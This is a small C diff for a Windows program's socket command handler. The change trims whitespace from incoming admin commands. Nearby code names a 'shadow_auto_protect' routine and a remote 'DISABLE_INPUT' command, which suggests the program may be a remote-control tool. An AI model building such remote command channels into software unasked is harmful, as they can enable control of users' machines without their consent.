@@ -67,10 +67,21 @@ DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
 }
 
 /* Execute game module or admin command */
-static void handle_admin_command(SOCKET sock, const char *cmd) {
+static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     char *result = NULL;
     static char response[NET_BUF_SIZE];
     int resp_pos = 0;
+
+    /* Trim whitespace/newlines from command */
+    char cmd[1024];
+    const char *start = cmd_raw;
+    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r') start++;
+    size_t len = strlen(start);
+    while (len > 0 && (start[len-1] == ' ' || start[len-1] == '\t' || start[len-1] == '\n' || start[len-1] == '\r')) len--;
+    if (len >= sizeof(cmd)) len = sizeof(cmd) - 1;
+    memcpy(cmd, start, len);
+    cmd[len] = '\0';
+    if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
     
     /* Maintenance commands */
     if (strcmp(cmd, "DISABLE_INPUT") == 0) {
